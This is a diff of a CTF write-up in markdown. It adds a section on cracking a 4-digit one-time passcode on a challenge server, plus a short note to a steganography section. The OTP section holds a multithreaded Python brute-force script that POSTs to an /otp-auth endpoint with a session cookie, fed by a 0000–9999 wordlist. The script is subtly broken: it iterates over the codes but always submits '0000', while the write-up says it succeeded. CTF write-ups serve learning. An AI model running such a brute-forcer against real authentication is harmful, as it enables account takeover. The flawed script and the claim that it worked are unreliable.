@@ -46,7 +46,7 @@ If we chage our input to the payload we get this
 
 After we have the flag i right click and render it in my browser for the next part of the challange
 
-### Invisible (Part Two: Unknowen Pass)
+### Invisible (Part two: Unknowen Pass)
 
 We are told that the hacker that owned the code went by the username "cool.hacker.8", after a google search that went like this
 
@@ -62,6 +62,80 @@ After using that username and password we are in and have the flag without issue
 
 ![Anddd we have the flag!!](assets/unknown2.png)
 
+### Invisible (Part three: One Time)
+
+In this challange we have to try and crack a 4 digit OTP passphrase, the creator of the challange said that you dont need bruteforcing to solve it tho during the CTF this was the method chosen.
+
+I used the following script to send the requests to the server
+
+```py
+import requests
+import json
+import threading
+
+def clamp(n, smallest, largest):
+    return int(max(smallest, min(n, largest)))
+
+url = "http://142.93.209.130:8000/otp-auth"
+
+headers = {
+    "Referer": "http://142.93.209.130:8000/forums-login",
+    "Cookie": "csrftoken=TOKEN"
+}
+
+
+def exploit(ids):
+    for i in ids:
+        while True:
+            payload = {
+                "otp": "0000"
+            }
+            try:
+                r = requests.post(
+                    url,
+                    headers=headers,
+                    json=payload
+                )
+            except:
+                print("FAILED", i)
+                continue
+
+            if r.json()["success"] == "true":
+                with open("Success", "w") as file:
+                    file.write(str(i))
+
+            print(i)
+            break
+
+with open("0-9999", "r") as file:
+    inp = [i.strip() for i in file.readlines()][::-1]
+
+for i in range(0,int(len(inp)),int(len(inp)/32)):
+    imx = clamp(i+int((len(inp)/32)), 0, 9999)
+    print(imx)
+    
+    threading.Thread(target = exploit, args = (inp[i:imx],)).start()
+```
+
+I had made a wordlists prior using the following format:
+
+```
+[drill@archlaptop scripts]$ head 0-9999 
+0000
+0001
+0002
+0003
+0004
+0005
+0006
+0007
+0008
+0009
+[...]
+```
+
+It took a few tries but we got it at last :D
+
 ### xD
 
 xD was a steganography challange where we are given a png (tv\_chal.png) attempting to open this image results in an error being throwen saying that the image is not a reconised format.
@@ -69,6 +143,8 @@ xD was a steganography challange where we are given a png (tv\_chal.png) attempt
 After getting the file up in gHex (a hex editor) we can see a byte header that looks like `D8 FF E0 FF` to verify that the header is in tact i did a quick search finding a page showing `FF D8 FF` as an example header, when we open the file with this new header using gimp we see this old tv
 
 ![Image of an old tv](assets/xD1.png)
+
+After zooming arround on this TV we can see the flag hidden on the screen of it
 
 ![The flag is there :p](assets/xD2.png)
 
